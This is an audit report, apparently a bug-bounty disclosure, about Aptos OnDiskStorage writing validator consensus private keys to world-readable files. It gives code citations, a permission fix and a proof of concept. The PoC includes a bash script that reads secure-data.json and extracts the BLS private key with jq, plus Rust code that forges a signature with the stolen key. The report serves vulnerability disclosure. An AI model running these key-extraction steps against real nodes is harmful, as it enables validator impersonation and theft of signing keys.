# Audit Report

## Title
World-Readable Consensus Private Keys in OnDiskStorage Allow Validator Impersonation and Consensus Safety Violations

## Summary
The `OnDiskStorage` implementation creates files with default Unix permissions, resulting in world-readable files (0o644 with typical umask 0o022) that contain consensus private keys. Despite documentation stating it should not be used in production, validator configuration files deploy OnDiskStorage for consensus safety rules storage. Any unprivileged process on the validator node can read `secure-data.json`, extract the BLS12381 consensus private key, and forge signatures to cause consensus safety violations.

## Finding Description
The vulnerability exists in the file creation logic of `OnDiskStorage` which stores cryptographic keys for consensus validators. [1](#0-0) [2](#0-1) 

The `File::create()` calls do not specify explicit Unix permissions. On Unix systems, this results in files created with mode 0o666 before umask application. With the typical umask of 0o022, files are created as 0o644 (rw-r--r--), making them **world-readable**.

In contrast, the codebase contains a secure file writing function that properly restricts permissions: [3](#0-2) 

This function sets mode 0o600 (user-only read/write) for sensitive data, but `OnDiskStorage` does not use it.

The consensus private keys are stored in OnDiskStorage through the `PersistentSafetyStorage` abstraction: [4](#0-3) [5](#0-4) 

The storage uses the `CONSENSUS_KEY` constant to store BLS12381 private keys: [6](#0-5) 

Despite documentation explicitly warning against production use: [7](#0-6) 

Validator deployment configurations **do** use `on_disk_storage`: [8](#0-7) [9](#0-8) 

**Attack Path:**
1. Attacker gains code execution on validator node (via RCE in any service, compromised sidecar, or local access)
2. Attacker reads `/opt/aptos/data/secure-data.json` (world-readable)
3. Attacker extracts consensus private key from JSON
4. Attacker forges consensus votes/signatures offline
5. Attacker injects malicious votes causing double-signing or equivocation
6. Network experiences consensus safety violation or validator slashing

## Impact Explanation
**Severity: CRITICAL** (Aptos Bug Bounty: up to $1,000,000)

This vulnerability satisfies multiple Critical severity criteria:

1. **Consensus/Safety violations**: An attacker with the consensus private key can forge signatures on conflicting blocks, causing equivocation and breaking BFT safety guarantees (< 1/3 Byzantine fault tolerance).

2. **Validator impersonation**: Complete compromise of validator identity allows participation in consensus as the victim validator.

3. **Chain fork potential**: Forged signatures can contribute to competing quorum certificates, causing network splits.

4. **Validator slashing**: Honest validators can be slashed for apparent double-signing caused by the attacker.

The vulnerability breaks the **Cryptographic Correctness** invariant (BLS signatures must be secure) and the **Consensus Safety** invariant (AptosBFT must prevent chain splits under < 1/3 Byzantine).

## Likelihood Explanation
**Likelihood: MEDIUM-HIGH**

Prerequisites for exploitation:
- Attacker needs **any** process execution on the validator node (not root required)
- No network-based remote exploit needed
- Requires access to local filesystem

This is highly likely because:
1. Validator nodes run multiple services (metrics exporters, monitoring agents, logging sidecars)
2. Any RCE vulnerability in these services provides filesystem access
3. Container escape or host access provides immediate key theft
4. No defense-in-depth: single compromise = total key exposure

The validator security context provides process isolation but **not file-level access control**: [10](#0-9) [11](#0-10) 

Even with `runAsUser: 6180` and restricted capabilities, any process in the container or with volume access can read world-readable files.

## Recommendation
**Immediate Fix: Set Restrictive File Permissions**

Modify `OnDiskStorage` to use mode 0o600 (user-only read/write) when creating files:

```rust
// In secure/storage/src/on_disk.rs
use std::fs::OpenOptions;
#[cfg(unix)]
use std::os::unix::fs::OpenOptionsExt;

impl OnDiskStorage {
    fn new_with_time_service(file_path: PathBuf, time_service: TimeService) -> Self {
        if !file_path.exists() {
            let mut opts = OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            #[cfg(unix)]
            opts.mode(0o600);  // User-only read/write
            
            opts.open(&file_path)
                .unwrap_or_else(|_| panic!("Unable to create storage at path: {:?}", file_path));
        }
        // ... rest of implementation
    }
    
    fn write(&self, data: &HashMap<String, Value>) -> Result<(), Error> {
        let contents = serde_json::to_vec(data)?;
        let mut opts = OpenOptions::new();
        opts.write(true).create(true).truncate(true);
        #[cfg(unix)]
        opts.mode(0o600);  // User-only read/write
        
        let mut file = opts.open(self.temp_path.path())?;
        file.write_all(&contents)?;
        fs::rename(&self.temp_path, &self.file_path)?;
        Ok(())
    }
}
```

**Long-term Recommendations:**
1. **Migrate to Vault**: Use `VaultStorage` for production validators as intended
2. **Deprecate OnDiskStorage**: Remove from production configurations
3. **Add permission checks**: Validate file permissions at startup
4. **Encrypted storage**: Encrypt sensitive data before writing to disk

## Proof of Concept

**Step 1: Demonstrate world-readable file creation**

```rust
// poc_file_permissions.rs
use std::fs::File;
use std::os::unix::fs::PermissionsExt;

fn main() {
    // Simulate OnDiskStorage behavior
    let path = "/tmp/test-secure-data.json";
    File::create(path).expect("Failed to create file");
    
    let metadata = std::fs::metadata(path).expect("Failed to read metadata");
    let permissions = metadata.permissions();
    let mode = permissions.mode();
    
    println!("File permissions: {:o}", mode & 0o777);
    // Expected output with umask 0o022: "644" (world-readable)
    
    if (mode & 0o004) != 0 {
        println!("VULNERABLE: File is world-readable!");
    }
}
```

**Step 2: Extract consensus key from secure-data.json**

```bash
#!/bin/bash
# Run as unprivileged process on validator node

# Read the supposedly secure file
cat /opt/aptos/data/secure-data.json

# Extract consensus private key
jq -r '.consensus.value.value' /opt/aptos/data/secure-data.json > stolen-key.hex

# Key is now available for offline signature forging
echo "Consensus private key stolen: $(wc -c < stolen-key.hex) bytes"
```

**Step 3: Forge consensus signature**

```rust
// forge_signature.rs
use aptos_crypto::bls12381::{PrivateKey, Signature};
use aptos_crypto::{SigningKey, Uniform};

fn main() {
    // Load stolen key from secure-data.json
    let stolen_key_bytes = std::fs::read("stolen-key.hex").expect("Failed to read stolen key");
    let private_key = PrivateKey::try_from(&stolen_key_bytes[..]).expect("Invalid key format");
    
    // Forge signature on malicious consensus vote
    let malicious_vote = b"conflicting block hash";
    let forged_signature = private_key.sign_arbitrary_message(malicious_vote);
    
    println!("Forged signature: {:?}", forged_signature);
    println!("Attack successful: Can now participate in consensus as victim validator");
}
```

This demonstrates complete consensus key compromise through world-readable file permissions.

---

**Notes:**
The vulnerability is particularly severe because:
1. OnDiskStorage is actively used in deployment configurations despite warnings
2. No encryption or access control protects the keys
3. Single point of failure: one filesystem read = total key compromise
4. Affects all validators using the default configuration templates
5. Silent failure: no audit logs or alerts when keys are read

### Citations

**File:** secure/storage/src/on_disk.rs (L35-38)
```rust
        if !file_path.exists() {
            File::create(&file_path)
                .unwrap_or_else(|_| panic!("Unable to create storage at path: {:?}", file_path));
        }
```

**File:** secure/storage/src/on_disk.rs (L64-70)
```rust
    fn write(&self, data: &HashMap<String, Value>) -> Result<(), Error> {
        let contents = serde_json::to_vec(data)?;
        let mut file = File::create(self.temp_path.path())?;
        file.write_all(&contents)?;
        fs::rename(&self.temp_path, &self.file_path)?;
        Ok(())
    }
```

**File:** crates/aptos/src/common/utils.rs (L224-229)
```rust
pub fn write_to_user_only_file(path: &Path, name: &str, bytes: &[u8]) -> CliTypedResult<()> {
    let mut opts = OpenOptions::new();
    #[cfg(unix)]
    opts.mode(0o600);
    write_to_file_with_opts(path, name, bytes, &mut opts)
}
```

**File:** consensus/safety-rules/src/persistent_safety_storage.rs (L63-81)
```rust
    fn initialize_keys_and_accounts(
        internal_store: &mut Storage,
        author: Author,
        consensus_private_key: bls12381::PrivateKey,
    ) -> Result<(), Error> {
        let result = internal_store.set(CONSENSUS_KEY, consensus_private_key);
        // Attempting to re-initialize existing storage. This can happen in environments like
        // forge. Rather than be rigid here, leave it up to the developer to detect
        // inconsistencies or why they did not reset storage between rounds. Do not repeat the
        // checks again below, because it is just too strange to have a partially configured
        // storage.
        if let Err(aptos_secure_storage::Error::KeyAlreadyExists(_)) = result {
            warn!("Attempted to re-initialize existing storage");
            return Ok(());
        }

        internal_store.set(OWNER_ACCOUNT, author)?;
        Ok(())
    }
```

**File:** consensus/safety-rules/src/persistent_safety_storage.rs (L98-104)
```rust
    pub fn default_consensus_sk(
        &self,
    ) -> Result<bls12381::PrivateKey, aptos_secure_storage::Error> {
        self.internal_store
            .get::<bls12381::PrivateKey>(CONSENSUS_KEY)
            .map(|v| v.value)
    }
```

**File:** config/global-constants/src/lib.rs (L12-12)
```rust
pub const CONSENSUS_KEY: &str = "consensus";
```

**File:** secure/storage/README.md (L37-42)
```markdown
- `OnDisk`: Similar to InMemory, the OnDisk secure storage implementation provides another
useful testing implementation: an on-disk storage engine, where the storage backend is
implemented using a single file written to local disk. In a similar fashion to the in-memory
storage, on-disk should not be used in production environments as it provides no security
guarantees (e.g., encryption before writing to disk). Moreover, OnDisk storage does not
currently support concurrent data accesses.
```

**File:** docker/compose/aptos-node/validator.yaml (L11-14)
```yaml
    backend:
      type: "on_disk_storage"
      path: secure-data.json
      namespace: ~
```

**File:** terraform/helm/aptos-node/files/configs/validator-base.yaml (L14-17)
```yaml
    backend:
      type: "on_disk_storage"
      path: secure-data.json
      namespace: ~
```

**File:** terraform/helm/aptos-node/templates/validator.yaml (L193-203)
```yaml
        securityContext:
          {{- if $.Values.enablePrivilegedMode }}
          runAsUser: 0
          privileged: true
          {{- else }}
          readOnlyRootFilesystem: true
          allowPrivilegeEscalation: false
          capabilities:
            drop:
            - ALL
          {{- end }}
```

**File:** terraform/helm/aptos-node/templates/validator.yaml (L217-227)
```yaml
      securityContext:
        {{- if $.Values.enablePrivilegedMode }}
        runAsUser: 0
        runAsGroup: 0
        fsGroup: 0
        {{- else }}
        runAsNonRoot: true
        runAsUser: 6180
        runAsGroup: 6180
        fsGroup: 6180
        {{- end }}
```
